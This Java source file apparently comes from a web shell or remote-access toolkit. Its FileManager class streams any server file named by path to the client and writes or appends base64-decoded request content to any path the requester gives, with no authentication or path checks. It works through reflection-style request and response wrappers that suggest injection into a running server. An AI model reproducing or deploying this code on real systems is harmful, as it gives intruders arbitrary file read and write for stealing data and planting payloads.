package com.stdout.Models;

import com.stdout.Config.DefaultConfig;
import com.stdout.Utils.Redefine.*;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;
import java.util.Base64;

public class FileManager {
    public static void download(Object response, String path) throws Exception {
        try {
            MyResponse.setContentType(response, "multipart/form-data");
            MyResponse.setCharacterEncoding(response, "utf-8");
            File file = new File(path);
            String fileName = file.getName();
            MyResponse.setHeader(response, "Content-Disposition", "attachment;fileName=" + fileName);

            ByteBuffer br = ByteBuffer.allocate(513);
            FileInputStream f = new FileInputStream(file);
            int byteRead = f.read(br.array());
            while (byteRead > 0) {
                byte[] data = new byte[byteRead];
                System.arraycopy(br.array(), 0, data, 0, byteRead);
                Object outputStream = MyResponse.getOutputStream(response);
                MyServletOutputStream.write(outputStream, data, 0, byteRead);
                br.clear();
                byteRead = f.read(br.array());
            }
            f.close();
        } catch (Exception e) {
            return;
        }
    }

    public static String uploadView() throws Exception {
        String result = MyReader.readSource(DefaultConfig.TemplatesConfig.Upload);

        return result;
    }

    public static String upload(Object request) throws Exception {
        String result = "";
        try {
            String path = MyRequest.getParameter(request, "path");
            String file = MyRequest.getParameter(request, "file").replaceAll("\n", "").replaceAll("\r", "");
            String mode = MyRequest.getParameter(request, "mode");
            FileOutputStream f;
            if (mode.equals("append")) {
                f = new FileOutputStream(path, true);
            } else {
                f = new FileOutputStream(path, false);
            }
            f.write(Base64.getDecoder().decode(file));
            f.close();
            result += "upload success, you file is at ==> " + path;
        } catch (Exception e) {
            result += e.getMessage();
            e.printStackTrace();
            result += "upload failed, please check the content";
        }
        return result;
    }
}
